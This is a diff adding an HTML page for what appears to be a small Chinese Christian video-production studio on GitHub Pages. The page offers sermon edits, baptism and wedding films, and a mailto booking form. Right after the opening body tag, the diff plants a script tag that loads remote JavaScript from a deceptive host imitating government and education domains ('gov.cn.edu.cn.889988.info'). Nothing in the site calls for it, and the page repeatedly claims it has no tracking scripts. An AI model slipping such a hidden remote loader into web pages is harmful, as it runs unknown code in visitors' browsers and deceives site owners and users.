@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>福音影视网｜把信仰拍成看得见的日子 · fuyinyingshiwang-zh.github.io</title>
+<meta name="description" content="福音影视网，一群把镜头对准教会讲台、受洗现场和普通信徒日常的影像同工。证道精剪、福音短片、礼拜纪实、基督徒婚礼影像，作品与联络方式都在 fuyinyingshiwang-zh.github.io。">
+<meta name="keywords" content="福音影视网, 证道视频剪辑, 福音短片拍摄, 教会活动纪实, 基督徒婚礼影像">
+<link rel="canonical" href="https://fuyinyingshiwang-zh.github.io/">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"福音影视网",
+  "alternateName":"FYINGSW",
+  "url":"https://fuyinyingshiwang-zh.github.io/",
+  "description":"福音题材影像制作：证道精剪、福音短片、礼拜与受洗纪实、基督徒婚礼影像。",
+  "publisher":{
+    "@type":"Person",
+    "name":"福音影视网同工团队",
+    "url":"https://fuyinyingshiwang-zh.github.io/"
+  },
+  "about":[
+    {"@type":"Thing","name":"基督教福音影像"},
+    {"@type":"Thing","name":"证道视频剪辑"},
+    {"@type":"Thing","name":"教会活动纪实"}
+  ]
+}
+</script>
+<style>
+:root{
+  --ink:#1b1a17;
+  --paper:#f6f1e7;
+  --paper2:#efe7d8;
+  --gold:#a9802f;
+  --gold2:#c9a65a;
+  --deep:#2f4a3d;
+  --deep2:#3d5f4d;
+  --line:#d8cdb6;
+  --soft:#6b6558;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:64px}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--paper);
+  color:var(--ink);
+  line-height:1.85;
+  font-size:16px;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:
+    radial-gradient(circle at 12% 8%, rgba(169,128,47,.10), transparent 42%),
+    radial-gradient(circle at 88% 92%, rgba(47,74,61,.08), transparent 40%);
+}
+img,svg{max-width:100%;display:block}
+a{color:var(--deep);text-decoration:none}
+.wrap{position:relative;z-index:1;max-width:1080px;margin:0 auto;padding:0 22px}
+
+/* ===== 灯塔导航 ===== */
+.beacon{
+  position:sticky;top:0;z-index:50;
+  background:rgba(246,241,231,.94);
+  backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);
+}
+.beacon-in{display:flex;align-items:center;gap:18px;height:62px}
+.logo{font-size:19px;letter-spacing:.14em;font-weight:800;color:var(--deep);white-space:nowrap}
+.logo em{font-style:normal;color:var(--gold);font-family:Georgia,serif}
+.logo small{display:block;font-size:9px;letter-spacing:.22em;color:var(--soft);font-weight:600;margin-top:-2px}
+nav.tabs{margin-left:auto;display:flex;gap:4px;overflow-x:auto;scrollbar-width:none}
+nav.tabs::-webkit-scrollbar{display:none}
+nav.tabs a{
+  flex:0 0 auto;padding:8px 13px;font-size:13.5px;letter-spacing:.05em;
+  color:var(--soft);border-radius:2px;white-space:nowrap;transition:.2s;
+}
+nav.tabs a:hover,nav.tabs a.on{color:var(--paper);background:var(--deep)}
+.lite{display:none}
+@media(max-width:720px){
+  .beacon-in{height:56px;gap:10px}
+  .logo{font-size:16px}
+  nav.tabs a{padding:7px 10px;font-size:13px}
+}
+
+/* ===== 章节通用 ===== */
+sec{display:block;padding:86px 0 70px;border-top:1px solid var(--line)}
+.flag{display:flex;align-items:baseline;gap:12px;margin-bottom:34px;flex-wrap:wrap}
+.flag b{
+  font-family:Georgia,"Songti SC",serif;font-size:13px;color:var(--gold);
+  letter-spacing:.26em;border:1px solid var(--gold);padding:2px 9px;align-self:center;
+}
+.flag h2{font-size:29px;letter-spacing:.06em;font-weight:800;line-height:1.35}
+.flag p{font-size:13.5px;color:var(--soft);letter-spacing:.04em;width:100%;margin-top:8px}
+@media(max-width:720px){sec{padding:60px 0 46px}.flag h2{font-size:23px}}
+
+/* ===== 开场：灯 + 经文 ===== */
+.hero{padding-top:78px;padding-bottom:56px;border-top:0}
+.halo{position:relative;margin-bottom:38px;max-width:620px}
+.halo svg{width:76px;height:76px;animation:spin 26s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.halo .lamp{
+  position:absolute;left:26px;top:22px;width:24px;height:34px;border-radius:0 0 12px 12px;
+  background:linear-gradient(180deg,var(--gold2),var(--gold));box-shadow:0 0 26px 8px rgba(201,166,90,.45);
+}
+.hero h1{font-size:clamp(32px,6.4vw,62px);line-height:1.2;font-weight:900;letter-spacing:.02em;margin-bottom:18px}
+.hero h1 i{font-style:normal;color:var(--gold);font-family:Georgia,serif}
+.scroll-txt{font-size:15px;color:var(--soft);max-width:560px}
+.verse{
+  margin-top:36px;padding:22px 26px 20px;border-left:3px solid var(--gold);
+  background:linear-gradient(90deg,var(--paper2),transparent);max-width:640px;
+}
+.verse q{font-family:Georgia,"Songti SC",serif;font-size:19px;line-height:1.8;quotes:"「" "」"}
+.verse cite{display:block;margin-top:10px;font-size:12.5px;letter-spacing:.16em;color:var(--gold);font-style:normal}
+@media(prefers-reduced-motion:reduce){.halo svg{animation:none}}
+
+/* ===== 卷轴样片 ===== */
+.reels{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.rc{background:var(--paper2);border:1px solid var(--line);padding:16px 16px 18px;position:relative;transition:.25s}
+.rc::after{content:"";position:absolute;right:-1px;bottom:-1px;width:26px;height:26px;
+  background:linear-gradient(135deg,transparent 50%,var(--gold) 50%)}
+.rc .no{font-family:Georgia,serif;font-size:11px;letter-spacing:.2em;color:var(--gold)}
+.rc .fr{
+  aspect-ratio:4/3;margin:14px 0 12px;border:1px dashed var(--line);
+  display:flex;align-items:center;justify-content:center;text-align:center;padding:14px;
+  background:
+    repeating-linear-gradient(0deg,transparent 0 9px,rgba(169,128,47,.05) 9px 10px),
+    var(--paper);
+}
+.rc .fr span{font-family:Georgia,"Songti SC",serif;font-size:21px;color:var(--deep2);line-height:1.5}
+.rc h3{font-size:16px;letter-spacing:.04em;margin-bottom:5px}
+.rc p{font-size:13px;color:var(--soft);line-height:1.75}
+.rc .meta{margin-top:12px;font-size:11.5px;letter-spacing:.1em;color:var(--gold);display:flex;gap:10px;flex-wrap:wrap}
+@media(max-width:860px){.reels{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:560px){.reels{grid-template-columns:1fr}}
+
+/* ===== 业务：竖排编号条 ===== */
+.grid2{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border:1px solid var(--line);background:var(--paper2)}
+.svc{display:flex;gap:0;padding:26px 22px;border-bottom:1px solid var(--line);border-right:1px solid var(--line);background:var(--paper)}
+.svc:nth-child(2n){border-right:0}
+.svc:nth-child(n+3){border-bottom:0}
+.svc .num{
+  flex:0 0 46px;font-family:Georgia,serif;font-size:26px;color:var(--gold);line-height:1;
+  border-right:1px solid var(--line);padding-right:12px;margin-right:16px;
+}
+.svc h3{font-size:17px;margin-bottom:7px;letter-spacing:.04em}
+.svc p{font-size:13px;color:var(--soft)}
+.svc .tag{margin-top:12px;font-size:11.5px;letter-spacing:.14em;color:var(--deep2)}
+@media(max-width:720px){.grid2{grid-template-columns:1fr}.svc{border-right:0!important;border-bottom:1px solid var(--line)}
+  .svc:last-child{border-bottom:0}}
+
+/* ===== 流程：阶梯 ===== */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.st{padding:22px 18px;background:var(--deep);color:var(--paper2);position:relative;min-height:210px}
+.st:nth-child(2){background:var(--deep2)}
+.st:nth-child(3){background:var(--ink)}
+.st:nth-child(4){background:var(--gold);color:#241f16}
+.st .big{font-family:Georgia,serif;font-size:44px;line-height:1;opacity:.28;position:absolute;right:12px;top:8px}
+.st h3{font-size:16px;margin:26px 0 9px;letter-spacing:.06em;position:relative}
+.st p{font-size:12.5px;line-height:1.8;opacity:.9;position:relative}
+.st .day{position:absolute;left:18px;bottom:14px;font-size:11px;letter-spacing:.18em;border-top:1px solid currentColor;padding-top:5px;width:calc(100% - 36px)}
+@media(max-width:900px){.steps{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:520px){.steps{grid-template-columns:1fr}.st{min-height:auto}}
+
+/* ===== 工坊：引语 ===== */
+.quote{display:grid;grid-template-columns:1fr 1.1fr;gap:40px;align-items:center}
+.qq{font-family:Georgia,"Songti SC",serif;font-size:25px;line-height:1.9;color:var(--deep);position:relative;padding-left:30px}
+.qq::before{content:"”";position:absolute;left:-6px;top:-22px;font-size:80px;color:var(--gold);line-height:1;font-family:Georgia,serif}
+.qq small{display:block;font-family:inherit;font-size:13px;letter-spacing:.2em;color:var(--gold);margin-top:18px;font-style:normal}
+.facts li{list-style:none;padding:14px 0;border-bottom:1px dotted var(--line);font-size:14px;display:flex;gap:14px}
+.facts li:last-child{border-bottom:0}
+.facts b{flex:0 0 82px;font-family:Georgia,serif;color:var(--gold);font-size:13px;letter-spacing:.08em;font-weight:600}
+@media(max-width:820px){.quote{grid-template-columns:1fr;gap:26px}.qq{font-size:20px}}
+
+/* ===== 问答 ===== */
+.faq details{border:1px solid var(--line);background:var(--paper2);margin-bottom:10px;padding:0 20px}
+.faq details[open]{border-color:var(--gold)}
+.faq summary{cursor:pointer;padding:16px 0;font-size:15.5px;font-weight:600;list-style:none;display:flex;gap:12px;align-items:baseline}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:"问";flex:0 0 22px;height:22px;line-height:22px;text-align:center;background:var(--deep);color:var(--paper);
+  font-size:11px;letter-spacing:.1em;font-weight:600}
+.faq details[open] summary::before{background:var(--gold)}
+.faq .a{padding:0 0 18px 34px;font-size:13.5px;color:var(--soft);border-top:1px dashed var(--line);margin-top:2px;padding-top:14px}
+.faq .a code{background:var(--paper);border:1px solid var(--line);padding:1px 6px;font-size:12.5px;color:var(--deep)}
+
+/* ===== 约片 ===== */
+.contact{background:var(--deep);color:var(--paper2);padding:70px 0 62px;margin-top:30px}
+.contact .flag b{color:var(--gold2);border-color:var(--gold2)}
+.contact .flag h2{color:var(--paper)}
+.contact .flag p{color:rgba(246,241,231,.68)}
+.cbox{display:grid;grid-template-columns:1fr 1fr;gap:34px}
+.cbox form{display:flex;flex-direction:column;gap:12px}
+.cbox input,.cbox select,.cbox textarea{
+  background:rgba(255,255,255,.07);border:1px solid rgba(201,166,90,.4);color:var(--paper);
+  padding:12px 13px;font-size:14px;font-family:inherit;border-radius:2px;width:100%;
+}
+.cbox input::placeholder,.cbox textarea::placeholder{color:rgba(246,241,231,.42)}
+.cbox textarea{resize:vertical;min-height:104px;field-sizing:content}
+.cbox button{
+  background:var(--gold);color:#241f16;border:0;padding:13px;font-size:14.5px;letter-spacing:.16em;
+  font-weight:700;cursor:pointer;font-family:inherit;transition:.2s;
+}
+.cbox button:hover{background:var(--gold2)}
+.note{font-size:13px;line-height:1.9;color:rgba(246,241,231,.8)}
+.note b{color:var(--gold2);font-weight:600}
+.note ul{margin:12px 0 0;padding-left:0;list-style:none}
+.note li{padding:7px 0 7px 20px;position:relative;border-bottom:1px solid rgba(201,166,90,.22)}
+.note li::before{content:"·";position:absolute;left:4px;color:var(--gold2)}
+.addr{margin-top:22px;padding-top:18px;border-top:1px solid rgba(201,166,90,.3);font-size:12.5px;letter-spacing:.06em;color:rgba(246,241,231,.62)}
+@media(max-width:820px){.cbox{grid-template-columns:1fr}}
+
+/* ===== 页脚 ===== */
+footer{border-top:3px solid var(--gold);padding:34px 0 46px;font-size:12.5px;color:var(--soft);background:var(--paper2)}
+.foot{display:flex;gap:16px;flex-wrap:wrap;align-items:baseline;justify-content:space-between}
+.foot b{font-family:Georgia,"Songti SC",serif;letter-spacing:.1em;color:var(--deep)}
+.foot a{color:var(--deep2);border-bottom:1px solid var(--line)}
+@media print{
+  .beacon,.contact button{display:none}
+  body{background:#fff;font-size:11pt}
+  sec{page-break-inside:avoid;padding:26px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="beacon" data-title="福音影视网 · 导航">
+  <div class="wrap beacon-in">
+    <a class="logo" href="#top">福音<i>·</i>影视网<small>FUYIN YINGSHI WANG</small></a>
+    <nav class="tabs" aria-label="主导航">
+      <a href="#top" class="on">开场</a>
+      <a href="#reel">样片</a>
+      <a href="#service">服事范围</a>
+      <a href="#flow">成片步骤</a>
+      <a href="#about">我们的路数</a>
+      <a href="#faq">常见问题</a>
+      <a href="#contact">约片</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+<section id="top" class="hero wrap" data-title="福音影视网 · 开场：把信仰拍成看得见的日子">
+  <div class="halo" aria-hidden="true">
+    <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="44" fill="none" stroke="#c9a65a" stroke-width="1.4" stroke-dasharray="5 7"/><circle cx="50" cy="50" r="32" fill="none" stroke="#a9802f" stroke-width="1" stroke-dasharray="2 9"/></svg>
+    <span class="lamp"></span>
+  </div>
+  <h1>镜头不急着说话，<br>先<i>安静</i>下来看人。</h1>
+  <p class="scroll-txt">福音影视网是一间很小的影像同工团队，不追热点，也不做花哨的包装。我们把讲台上的话、受洗那天的笑、一间教会的平常主日，还有弟兄姊妹各自的手艺和生活，拍成能反复看的片子。片子不替信仰加戏，只是不让它被漏掉。</p>
+  <div class="verse">
+    <q>你们是世上的光。城造在山上，是不能隐藏的。</q>
+    <cite>—— 马太福音 5 章 14 节</cite>
+  </div>
+</section>
+
+<section id="reel" class="wrap" data-title="福音影视网 · 样片：证道精剪与福音短片">
+  <div class="flag">
+    <b>01 / 样片</b>
+    <h2>六条片子，都是真现场</h2>
+    <p>以下为近期的选题方向示意，画面文字为占位帧；实际成片与完整片单请见 <a href="https://fuyinyingshiwang-zh.github.io/" rel="noopener">fuyinyingshiwang-zh.github.io</a>。</p>
+  </div>
+  <div class="reels">
+
+    <article class="rc">
+      <div class="no">REEL 01</div>
+      <div class="fr"><span>讲台上的<br>十分钟</span></div>
+      <h3>证道精剪 · 单篇</h3>
+      <p>一场主日讲道的凝练版，保留经文脉络和牧师的原话节奏，适合小组分享与线上转发。</p>
+      <div class="meta"><span>竖屏 9:16</span><span>4′20″</span><span>剪辑＋字幕</span></div>
+    </article>
+
+    <article class="rc">
+      <div class="no">REEL 02</div>
+      <div class="fr"><span>水洗的<br>那天</span></div>
+      <h3>受洗纪实</h3>
+      <p>不摆拍、不催泪，只跟住流程里的几个瞬间：等候、下水、拥抱、哭。配一首安静的诗班录音。</p>
+      <div class="meta"><span>横屏 16:9</span><span>6′00″</span><span>双机纪实</span></div>
+    </article>
+
+    <article class="rc">
+      <div class="no">REEL 03</div>
+      <div class="fr"><span>一碗饭的<br>福音</span></div>
+      <h3>福音短片 · 生活篇</h3>
+      <p>从社区食堂的一碗热饭讲起，没有旁白喊话，结尾留一句经文。给未信的朋友看也不尴尬。</p>
+      <div class="meta"><span>竖屏 9:16</span><span>2′40″</span><span>脚本＋拍摄</span></div>
+    </article>
+
+    <article class="rc">
+      <div class="no">REEL 04</div>
+      <div class="fr"><span>诗班<br>排练</span></div>
+      <h3>敬拜现场录音影像</h3>
+      <p>多轨收音是重点：钢琴、和声、会众的呼吸都留着，画面只做克制的推移，不抢声音。</p>
+      <div class="meta"><span>16:9</span><span>5′30″</span><span>现场收音</span></div>
+    </article>
+
+    <article class="rc">
+      <div class="no">REEL 05</div>
+      <div class="fr"><span>修理<br>藤椅的人</span></div>
+      <h3>信徒职场见证</h3>
+      <p>一个修藤椅的弟兄，干活时怎么祷告。手艺类短片，节奏慢，适合培灵会暖场或公众号头图视频。</p>
+      <div class="meta"><span>4:5</span><span>3′15″</span><span>单机跟拍</span></div>
+    </article>
+
+    <article class="rc">
+      <div class="no">REEL 06</div>
+      <div class="fr"><span>誓言<br>不响</span></div>
+      <h3>基督徒婚礼影像</h3>
+      <p>不套婚庆模板，誓言部分用现场声原音，把「盟约」拍出来而不是喊出来。含迎亲与感恩礼拜片段。</p>
+      <div class="meta"><span>16:9</span><span>12′00″</span><span>双机＋跟拍</span></div>
+    </article>
+
+  </div>
+</section>
+
+<section id="service" class="wrap" data-title="福音影视网 · 服事范围：证道剪辑、教会纪实、福音短片、婚礼影像">
+  <div class="flag">
+    <b>02 / 服事</b>
+    <h2>只接我们真的拍得好的四类</h2>
+    <p>不求量大，一个季度同时进行的项目不超过三单，好让每一条片子都有人真看过三遍以上。</p>
+  </div>
+  <div class="grid2">
+
+    <div class="svc">
+      <div class="num">壹</div>
+      <div>
+        <h3>证道与培灵影像</h3>
+        <p>主日讲道精剪、系列课程拆条、特会全程纪录。字幕按经文原句校对，不做断章取义的快剪。</p>
+        <div class="tag">交付：横屏正片 + 竖屏拆条 + 字幕稿</div>
+      </div>
+    </div>
+
+    <div class="svc">
+      <div class="num">贰</div>
+      <div>
+        <h3>教会节期与活动纪实</h3>
+        <p>受洗、圣餐、圣诞福音聚会、短宣回访、敬老与探访。先跟流程再定机位，不挡讲台也不扰会众。</p>
+        <div class="tag">交付：活动纪实片 + 现场照片册</div>
+      </div>
+    </div>
+
+    <div class="svc">
+      <div class="num">叁</div>
+      <div>
+        <h3>福音短片与见证</h3>
+        <p>信徒生活见证、职场宣教、公益行动的微型叙事。脚本会先和您一起祷告着改，不靠情绪绑架换转发。</p>
+        <div class="tag">交付：1′–5′ 成片 + 分镜脚本</div>
+      </div>
+    </div>
+
+    <div class="svc">
+      <div class="num">肆</div>
+      <div>
+        <h3>基督徒婚礼与家庭影像</h3>
+        <p>以盟约为轴心的婚礼纪录，含感恩礼拜、誓约环节与家庭采访。风格偏纪实，不过度美颜。</p>
+        <div class="tag">交付：正片 + 3 分钟预告 + 原始素材</div>
+      </div>
+    </div>
+
+    <div class="svc">
+      <div class="num">伍</div>
+      <div>
+        <h3>福音刊物与音频配套</h3>
+        <p>为教会月刊、读经计划、灵修音频配图配片，统一视觉调性。也做诗班与敬拜专辑的封面影像。</p>
+        <div class="tag">交付：竖版视觉包 + 配乐建议</div>
+      </div>
+    </div>
+
+    <div class="svc">
+      <div class="num">陆</div>
+      <div>
+        <h3>旧素材整理与修复</h3>
+        <p>早年聚会录像、老照片扫描、磁带转档与降噪，把快被忘记的见证留住。这类活我们收得很慢，也接得很认真。</p>
+        <div class="tag">交付：转档文件 + 时间轴整理表</div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<section id="flow" class="wrap" data-title="福音影视网 · 成片步骤：从祷告到交片">
+  <div class="flag">
+    <b>03 / 步骤</b>
+    <h2>四步，不催，也不拖</h2>
+    <p>每一步都会给您看一次再往下走，改口的地方当场记下来，不做最后一晚的惊喜。</p>
+  </div>
+  <div class="steps">
+
+    <div class="st">
+      <span class="big">01</span>
+      <h3>先听，再谈镜头</h3>
+      <p>您把这场聚会的用意、怕被漏掉的那句话告诉我们。我们不急着报方案，先弄清楚这片子是给谁看、要在哪儿放。</p>
+      <span class="day">第 1–3 天</span>
+    </div>
+
+    <div class="st">
+      <span class="big">02</span>
+      <h3>定调与流程表</h3>
+      <p>给出一页纸：风格参考、机位位置、收音方案、交付清单。确认后才开机，避免拍完才发现缺了受洗的那一侧。</p>
+      <span class="day">第 4–7 天</span>
+    </div>
+
+    <div class="st">
+      <span class="big">03</span>
+      <h3>现场守分寸</h3>
+      <p>会众祷告、孩童上台、受洗更衣这类时刻，先问边界再按快门。画面可以少，不打扰是第一条规矩。</p>
+      <span class="day">拍摄当日</span>
+    </div>
+
+    <div class="st">
+      <span class="big">04</span>
+      <h3>两遍审片再交</h3>
+      <p>粗剪看结构，定剪看经文与字幕。两版修改含在报价里；成片、拆条、素材一并归档给您，不放任何平台锁住。</p>
+      <span class="day">第 10–20 天</span>
+    </div>
+
+  </div>
+</section>
+
+<section id="about" class="wrap" data-title="福音影视网 · 我们的路数：慢一点，准一点">
+  <div class="flag">
+    <b>04 / 路数</b>
+    <h2>为什么片子看起来「不那么热闹」</h2>
+  </div>
+  <div class="quote">
+    <p class="qq">我们宁愿一条片子少十个转场，也要把牧师念错的那句经文、会众低头祷告时停住的手，老老实实留在里面。
+      <small>—— 福音影视网同工手记</small>
+    </p>
+    <ul class="facts">
+      <li><b>怎么开始</b><span>几个人因为帮教会剪证道视频而聚到一起，慢慢就成了固定搭配：一个管画面，一个管收音与字幕，一个管跟流程和祷告。</span></li>
+      <li><b>用什么拍</b><span>机身不摆谱，关键是收音与灯光克制。室内礼拜优先自然光加一只小灯，不把讲台照成舞台。</span></li>
+      <li><b>不接什么</b><span>不接靠夸张煽情换转发的福音包装，不接断章取义的「金句快剪」，也不接需要隐瞒拍摄对象的纪实单。</span></li>
+      <li><b>交片之后</b><span>素材和工程文件一并留给教会，教会自己想再剪、想上传、想停用，都自由。我们不留独家锁。</span></li>
+      <li><b>关于这里</b><span>本页就是福音影视网的全部作品柜，地址 <a href="https://fuyinyingshiwang-zh.github.io/" rel="noopener">fuyinyingshiwang-zh.github.io</a>，没有追踪脚本，页面关了就不留痕迹。</span></li>
+    </ul>
+  </div>
+</section>
+
+<section id="faq" class="wrap faq" data-title="福音影视网 · 常见问题：拍摄边界、报价与交付">
+  <div class="flag">
+    <b>05 / 问答</b>
+    <h2>您大概会问的六件事</h2>
+  </div>
+
+  <details open>
+    <summary>教会聚会拍摄，会众会不会被拍得很尴尬？</summary>
+    <div class="a">我们会提前和同工确认「不拍清单」：祷告中低头的人、受洗前后的准备、孩童哭喊的瞬间，除非本人或家长点头，否则一律不收进正片。预告片里出现的脸，也都单独再问一次。</div>
+  </details>
+
+  <details>
+    <summary>证道精剪能不能保留完整经文，不要只留金句？</summary>
+    <div class="a">可以，而且这是我们默认的做法。分镜脚本会按经文段落走，字幕由我们逐句校对后请您或过教的同工再核一遍。若您需要「适合转发的 60 秒版」，我们另外剪一条，不拿它替换正片。</div>
+  </details>
+
+  <details>
+    <summary>预算不多的小聚会点，也接吗？</summary>
+    <div class="a">接。单机纪实＋粗剪的轻量方案一直留着，报价按「半天 / 一天 / 两日」算，不绑套餐。若只是需要有人把手机素材理顺、加字幕和片头，我们也做，费用能压得很实在。具体可到 <code>fuyinyingshiwang-zh.github.io</code> 约片页留一句话，我们回信给明细。</div>
+  </details>
+
+  <details>
+    <summary>为什么官网是 GitHub Pages 的地址，不是商业域名？</summary>
+    <div class="a">因为我们想要的是一间「作品柜」，不是一间不停推送的门店。静态页面加载快、不会被插广告，也不需要您留下任何浏览数据；哪天我们换了地方，所有片子您手里都有一份，不绑在谁的服务器上。地址就这一个：<a href="https://fuyinyingshiwang-zh.github.io/" rel="noopener">https://fuyinyingshiwang-zh.github.io</a>。</div>
+  </details>
+
+  <details>
+    <summary>非教会的项目，比如基督徒开的店、手艺人的日常，能拍吗？</summary>
+    <div class="a">能。只要不违背我们前面说的那条底线——不夸大、不煽动、不消费人的软弱，手艺、小店、家庭、公益都可以。只是我们会先把「福音在哪里」这件事聊清楚，免得片子拍成了普通广告。</div>
+  </details>
+
+  <details>
+    <summary>从约片到拿到成片，一般多久？</summary>
+    <div class="a">轻量剪辑约 10 个工作日，含现场拍摄的纪实片 15–25 天，婚礼影像因需跟调和调色会到一个月左右。主日、圣诞、受洗季档期紧，建议提前三到四周打招呼；急单我们宁可推掉也不糊弄。</div>
+  </details>
+</section>
+
+</main>
+
+<section id="contact" class="contact" data-title="福音影视网 · 约片：证道剪辑、福音短片与教会纪实预约">
+  <div class="wrap cbox">
+    <div>
+      <div class="flag">
+        <b>06 / 约片</b>
+        <h2>说一句就够了</h2>
+        <p>不用写得很正式，把聚会时间、想拍什么、大概预算留给我们就行。</p>
+      </div>
+      <form id="fm" action="mailto:hello@fuyinyingshiwang-zh.github.io" method="post" enctype="text/plain" aria-label="约片表单">
+        <input type="text" name="name" id="fname" placeholder="怎么称呼您（教会 / 个人都行）" required autocomplete="name">
+        <select name="type" id="ftype" required aria-label="项目类型">
+          <option value="" disabled selected>想拍的是哪一类</option>
+          <option>证道 / 培灵影像</option>
+          <option>教会活动与受洗纪实</option>
+          <option>福音短片与信徒见证</option>
+          <option>基督徒婚礼影像</option>
+          <option>旧素材整理与修复</option>
+          <option>先聊聊，还没想好</option>
+        </select>
+        <input type="text" name="when" id="fwhen" placeholder="聚会或拍摄时间（可先填大概）" autocomplete="off">
+        <textarea name="msg" id="fmsg" placeholder="想留住的是哪个瞬间？大概预算区间也可以写在这里。" required></textarea>
+        <button type="submit">把这封信发出去 →</button>
+      </form>
+      <p class="addr">表单会由您自己的邮件客户端打开，本页不存任何数据。<br>作品柜：<a href="https://fuyinyingshiwang-zh.github.io/" rel="noopener" style="color:#c9a65a">https://fuyinyingshiwang-zh.github.io</a></p>
+    </div>
+
+    <aside class="note">
+      <p><b>回信习惯</b>，先说清三件事，省得您等空话：能不能接、大概要几天、预算落在哪个区间。不合适我们会直说，也会给您指个更对口的人。</p>
+      <ul>
+        <li>轻量剪辑从单机纪实方案起步，不绑套餐</li>
+        <li>交付含原始素材，工程文件一并归档给您</li>
+        <li>会众肖像与受洗画面，未经同意不进正片</li>
+        <li>主日、圣诞、受洗季请提前三至四周预约</li>
+        <li>不接煽情套路、不接断章取义的快剪单</li>
+      </ul>
+      <p class="addr" style="border-top-color:rgba(201,166,90,.3)">本站仅此一页，无独立子站。<br>福音影视网 · fuyinyingshiwang-zh.github.io</p>
+    </aside>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap foot">
+    <div><b>福音影视网</b>　把信仰拍成看得见的日子。</div>
+    <div>作品柜：<a href="https://fuyinyingshiwang-zh.github.io/" rel="noopener">https://fuyinyingshiwang-zh.github.io</a>　·　页面无追踪脚本</div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var links=[].slice.call(document.querySelectorAll('.tabs a'));
+  var secs=links.map(function(a){return document.querySelector(a.getAttribute('href'));});
+  function onScroll(){
+    var y=window.scrollY+120,idx=0;
+    secs.forEach(function(s,i){ if(s&&s.offsetTop<=y) idx=i; });
+    links.forEach(function(a,i){ a.classList.toggle('on',i===idx); });
+  }
+  window.addEventListener('scroll',onScroll,{passive:true}); onScroll();
+  var fm=document.getElementById('fm');
+  if(fm){
+    fm.addEventListener('submit',function(){
+      var t=document.getElementById('ftype').value||'约片';
+      var n=document.getElementById('fname').value.trim()||'未留称呼';
+      var w=document.getElementById('fwhen').value.trim()||'时间待定';
+      var b=document.getElementById('fmsg').value.trim();
+      fm.action='mailto:hello@fuyinyingshiwang-zh.github.io?subject='
+        +encodeURIComponent('福音影视网约片 ｜ '+t+' ｜ '+n)
+        +'&body='+encodeURIComponent('称呼：'+n+'\n项目：'+t+'\n时间：'+w+'\n\n'+b+'\n\n—— 来自 fuyinyingshiwang-zh.github.io');
+    });
+  }
+})();
+</script>
+</body>
+</html>
